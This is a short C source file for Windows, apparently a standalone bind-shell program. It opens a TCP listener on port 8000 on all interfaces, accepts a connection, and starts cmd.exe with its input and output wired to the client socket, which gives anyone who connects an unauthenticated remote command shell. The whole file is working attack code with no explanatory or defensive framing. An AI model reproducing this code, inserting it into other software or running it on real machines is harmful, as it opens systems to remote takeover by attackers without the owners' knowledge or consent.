# include <stdlib.h>
# include <stdio.h>

# include <windows.h>


int
main(void)
{
  WSADATA wsa = { 0 };
  SOCKET server, client;
  SOCKADDR_IN addr, client_addr;
  char buf[1024];
  int error = 0;
  STARTUPINFO si;
  PROCESS_INFORMATION pi;

  WSAStartup(MAKEWORD(2, 2), &wsa);
  server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (server == INVALID_SOCKET) {
    return EXIT_FAILURE;
  }
  printf("%s\n", "socket okay");

  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_ANY);
  addr.sin_port = htons(8000);
  error = bind(server, (SOCKADDR *)&addr, sizeof addr);
  if (error) {
    return EXIT_FAILURE;
  }
  printf("%s\n", "bind okay");

  error = listen(server, SOMAXCONN);
  if (error) {
    return EXIT_FAILURE;
  }
  printf("%s\n", "listen okay");

  client = accept(server, (SOCKADDR *)&client_addr, NULL);
  if (client == INVALID_SOCKET) {
    return EXIT_FAILURE;
  }
  printf("%s\n", "accept okay");

  memset(&si, 0, sizeof si);
  memset(&pi, 0, sizeof pi);
  si.cb = sizeof si;
  si.dwFlags |= STARTF_USESTDHANDLES;
  si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)client;
  if (!CreateProcessA(NULL, "cmd",
                      NULL, NULL, TRUE, 0, NULL, NULL,
                      &si, &pi)) {
    return EXIT_FAILURE;
  }
  printf("%s\n", "create okay");

  return EXIT_SUCCESS;
}
